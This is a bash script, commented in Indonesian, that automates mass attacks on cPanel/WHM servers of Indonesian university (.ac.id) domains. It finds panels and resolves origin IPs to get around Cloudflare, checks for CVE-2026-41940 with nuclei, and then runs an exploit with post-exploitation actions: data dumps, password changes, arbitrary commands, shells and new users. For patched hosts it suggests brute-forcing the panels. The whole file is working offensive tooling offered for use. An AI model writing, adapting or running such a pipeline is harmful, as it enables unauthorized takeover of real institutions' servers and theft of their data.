#!/usr/bin/env bash
# cpchain.sh — pipeline .ac.id → cPanel/WHM → CVE-2026-41940
#
# Tahap:
#   1. cfinder.py   : probe 6 port cPanel, fingerprint cpsrvd, resolve origin (bypass Cloudflare)
#   2. nuclei       : deteksi CVE-2026-41940 per host:port (template resmi)
#   3. CP-Bypass    : exploit + post-exploit (dump/passwd/cmd/shell/adduser) pada target rentan
#
# Pakai:
#   ./cpchain.sh -f $HOME/hacktools/acid_domains.txt --limit 200 -o out --workers 24
#   ./cpchain.sh -d kampus.ac.id -o out
#   ./cpchain.sh -f cp_hosts.txt --ports 2087,2086 --no-scan     # langsung dari hasil cfinder
#   ./cpchain.sh -f hits.txt --exploit --store out --action cmd --cmd "id"

set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CF="$HERE/cfinder.py"
CPB="$HERE/cpbypass/exploit.py"
NUC_T="$HOME/nuclei-templates/http/cves/2026/CVE-2026-41940.yaml"

LIST=""; DOMS=(); OUT="cpchain_out"; PORTS="2082,2083,2086,2087,2095,2096"
LIMIT=0; WORKERS=16; TIMEOUT=6
NOSCAN=0; EXPLOIT=0; STORE=""; ACTION=""; CMD=""; PASSWD=""; NEWUSER=""; NEWDOMAIN=""

while [ $# -gt 0 ]; do
  case "$1" in
    -f|--file) LIST="$2"; shift 2;;
    -d|--domain) DOMS+=("$2"); shift 2;;
    -o|--out) OUT="$2"; shift 2;;
    --ports) PORTS="$2"; shift 2;;
    --limit) LIMIT="$2"; shift 2;;
    --workers) WORKERS="$2"; shift 2;;
    --timeout) TIMEOUT="$2"; shift 2;;
    --no-scan) NOSCAN=1; shift;;
    --exploit) EXPLOIT=1; shift;;
    --store) EXPLOIT=2; STORE="$2"; shift 2;;   # --store hanya tulis target rentan ke file
    --action) ACTION="$2"; shift 2;;
    --cmd) CMD="$2"; shift 2;;
    --passwd) PASSWD="$2"; shift 2;;
    --new-user) NEWUSER="$2"; shift 2;;
    --new-domain) NEWDOMAIN="$2"; shift 2;;
    -h|--help) sed -n '2,20p' "$0"; exit 0;;
    *) echo "arg tidak dikenal: $1"; exit 1;;
  esac
done

mkdir -p "$OUT"
HITS="$OUT/cp_hosts.txt"

if [ "$NOSCAN" -eq 0 ]; then
  ARGS=(); [ -n "$LIST" ] && ARGS+=(-f "$LIST")
  for d in "${DOMS[@]:-}"; do [ -n "$d" ] && ARGS+=(-d "$d"); done
  [ ${#ARGS[@]} -eq 0 ] && { echo "butuh -f atau -d"; exit 1; }
  echo "== [1] cPanel discovery =="
  python3 "$CF" "${ARGS[@]}" --ports "$PORTS" --limit "$LIMIT" --workers "$WORKERS" \
          --timeout "$TIMEOUT" --origin -o "$OUT" | tee "$OUT/discovery.log"
else
  [ -n "$LIST" ] && cp "$LIST" "$HITS"
fi

[ -s "$HITS" ] || { echo "== tidak ada cPanel/WHM ditemukan =="; exit 0; }
mapfile -t LINES < "$HITS"

# target unik host:port untuk nuclei (origin diprioritaskan)
printf '%s\n' "${LINES[@]}" | awk -F'|' '$1!="" && $2!="" {u[$1":"$2]=$3"|"$1":"$2} END{for(k in u) print u[k]}' \
  | sort -u > "$OUT/targets_scheme.txt"
awk -F'|' '{print $1"://"$2}' "$OUT/targets_scheme.txt" > "$OUT/targets_url2.txt"

echo "== [2] deteksi CVE-2026-41940 (nuclei) =="
: > "$OUT/vulnerable.txt"
if [ -f "$NUC_T" ]; then
  while IFS='|' read -r scheme hp; do
    [ -z "${hp:-}" ] && continue
    res=$(timeout 120 nuclei -u "${scheme}://${hp}" -t "$NUC_T" -silent -no-color 2>/dev/null)
    if [ -n "$res" ]; then
      echo "$res" | tee -a "$OUT/vulnerable.txt"
      echo "${hp}" >> "$OUT/vulnerable_hosts.txt"
    fi
  done < "$OUT/targets_url2.txt"
else
  echo "[!] template nuclei CVE-2026-41940 tidak ada; lewati deteksi"
fi

if [ ! -s "$OUT/vulnerable_hosts.txt" ]; then
  echo "== tidak ada target rentan CVE-2026-41940 (semua ter-patch / terblokir) =="
  echo "   lanjut manual: brute panel pakai cracker/odcs_cpanel.py, atau cari CVE cPanel lain"
fi

[ "$EXPLOIT" -eq 0 ] && exit 0
[ -s "$OUT/vulnerable_hosts.txt" ] || exit 0

echo "== [3] exploit =="
if [ "$EXPLOIT" -eq 2 ]; then
  sort -u "$OUT/vulnerable_hosts.txt" > "$STORE"
  echo "target rentan ditulis ke $STORE"
  exit 0
fi

while read -r hp; do
  [ -z "$hp" ] && continue
  echo "-- $hp"
  if [ -n "$ACTION" ]; then
    A=(--action "$ACTION")
    [ -n "$CMD" ] && A+=(--cmd "$CMD")
    [ -n "$PASSWD" ] && A+=(--passwd "$PASSWD")
    [ -n "$NEWUSER" ] && A+=(--new-user "$NEWUSER")
    [ -n "$NEWDOMAIN" ] && A+=(--new-domain "$NEWDOMAIN")
    timeout 180 python3 "$CPB" -u "https://$hp" --timeout 20 --no-color "${A[@]}" \
      | tee -a "$OUT/exploit.log"
  else
    timeout 180 python3 "$CPB" -u "https://$hp" --timeout 20 --no-color | tee -a "$OUT/exploit.log"
  fi
done < <(sort -u "$OUT/vulnerable_hosts.txt")
echo "== selesai; log: $OUT/exploit.log =="
